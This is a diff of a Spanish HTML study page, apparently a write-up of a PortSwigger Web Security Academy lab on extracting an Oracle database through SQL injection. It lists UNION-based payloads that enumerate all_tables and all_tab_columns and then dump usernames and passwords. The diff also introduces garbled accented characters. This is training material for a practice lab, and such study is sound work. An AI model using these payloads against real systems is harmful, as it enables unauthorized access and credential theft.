@@ -1,10 +1,10 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="es">
 
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Lab 01 - Vulnerabilidad SQLi en cláusula WHERE</title>
+    <title>Lab 10 - Exfiltrar base de datos (Oracle)</title>
     <style>
         html,
         body {
@@ -112,7 +112,7 @@
 </head>
 
 <body>
-        <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
+    <div style="padding: 20px; max-width: 1000px; margin: 0 auto; padding-bottom: 0;">
         <button onclick="parent.cargaPractica('html/sql_injection.html')" style="background: linear-gradient(135deg, #f8fafc 0%, #ffffff 100%); color: #1e3a8a; border: 1px solid #e2e8f0; border-left: 5px solid #3b82f6; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-size: 1.15rem; font-weight: 700; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); transition: all 0.4s ease;" onmouseover="this.style.transform='translateY(-4px) scale(1.02)'; this.style.boxShadow='0 8px 20px rgba(59, 130, 246, 0.2)'; this.style.borderColor='#3b82f6'" onmouseout="this.style.transform='translateY(0) scale(1)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.05)'; this.style.borderColor='#e2e8f0'">
             &#8592; Regresar al Roadmap
         </button>
@@ -121,32 +121,30 @@
         <div class="wrap">
             <div class="panel">
                 <h1>Laboratorio 10</h1>
-                <h2>Vulnerabilidad SQLi en cláusula WHERE</h2>
+                <h2>Exfiltrar base de datos (Oracle)</h2>
                 <p>PortSwigger Web Security Academy</p>
             </div>
         </div>
 
         <div class="section">
-            <h3 class="section-title">Introducción</h3>
+            <h3 class="section-title">IntroducciÃ³n</h3>
         </div>
         <div class="content-area">
-            <p class="parrafo">Este laboratorio de PortSwigger se enfoca en explotar una vulnerabilidad clásica de
-                inyección SQL (SQLi) ubicada en la cláusula <code>WHERE</code> de una consulta utilizada para filtrar
-                productos comerciales por categoría.</p>
+            <p class="parrafo">Este laboratorio es similar al anterior pero en un entorno Oracle. El objetivo es extraer informaciÃ³n iterativamente de las tablas del esquema para encontrar al usuario administrador.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Desarrollo</h3>
         </div>
         <div class="content-area">
-            <p class='parrafo'>En lugar de information_schema, bases de datos como Oracle exponen esta informaci�n en tablas del sistema propietario como <code>all_tables</code> y <code>all_tab_columns</code>.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Extraer los nombres de las tablas: <code>'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>. Identificamos <code>USERS_XYZ</code>.</p><p class='parrafo'>2. Extraer columnas de la tabla identificada: <code>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ'--</code>. Identificamos <code>USERNAME_1</code> y <code>PASSWORD_2</code>.</p><p class='parrafo'>3. Volcamos la informaci�n usando las variables aleatorizadas: <code>'+UNION+SELECT+USERNAME_1,+PASSWORD_2+FROM+USERS_XYZ--</code> y conseguimos logearnos.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Explicaci�n</p><p class='parrafo'>Este proceso subraya que aunque Oracle esconde metadatos en tablas diferentes (usualmente precedidas con <code>all_</code> o <code>user_</code>), el proceso para cartografiar la base y el objetivo sigue exactamente la misma l�gica constructora iterativa.</p>
+            <p class='parrafo'>En lugar de information_schema, bases de datos como Oracle exponen esta informaciÃ³n en tablas del sistema propietario como <code>all_tables</code> y <code>all_tab_columns</code>.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>Pasos, Pruebas y Payloads</p><p class='parrafo'>1. Extraer los nombres de las tablas: <code>'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>. Identificamos <code>USERS_XYZ</code>.</p><p class='parrafo'>2. Extraer columnas de la tabla identificada: <code>'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_XYZ'--</code>. Identificamos <code>USERNAME_1</code> y <code>PASSWORD_2</code>.</p><p class='parrafo'>3. Volcamos la informaciÃ³n usando las variables aleatorizadas: <code>'+UNION+SELECT+USERNAME_1,+PASSWORD_2+FROM+USERS_XYZ--</code> y conseguimos logearnos.</p><p style='font-size:21px; font-weight:bold; margin-top:20px;'>ExplicaciÃ³n</p><p class='parrafo'>Este proceso subraya que aunque Oracle esconde metadatos en tablas diferentes (usualmente precedidas con <code>all_</code> o <code>user_</code>), el proceso para cartografiar la base y el objetivo sigue exactamente la misma lÃ³gica constructora iterativa.</p>
         </div>
 
         <div class="section">
             <h3 class="section-title">Contenido Multimedia</h3>
         </div>
         <div class="content-area" style="text-align: center;">
-            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaci�n de prueba.</p>
+            <p class="parrafo" style="margin-bottom: 20px; text-align: left;">Capturas de evidencia de los payloads ejecutados exitosamente en la aplicaciÃ³n de prueba.</p>
             <div style="background: #eaeaea; border: 2px dashed #b0b0b0; padding: 40px; border-radius: 8px; color: #555; font-style: italic;">
                 [Espacio reservado para captura de pantalla del usuario]
             </div>
@@ -160,7 +158,7 @@
         </div>
 
         <div class="section">
-            <h3 class="section-title">Referencias Técnicas</h3>
+            <h3 class="section-title">Referencias TÃ©cnicas</h3>
         </div>
         <div class="content-area">
             <p class="citas" style="font-size: 16px;">PortSwigger. (s.f.). <i>SQL injection attack, listing the database contents on Oracle</i>. Web Security Academy. Recuperado de https://portswigger.net/</p>
@@ -169,8 +167,3 @@
 </body>
 
 </html>
-
-
-
-
-
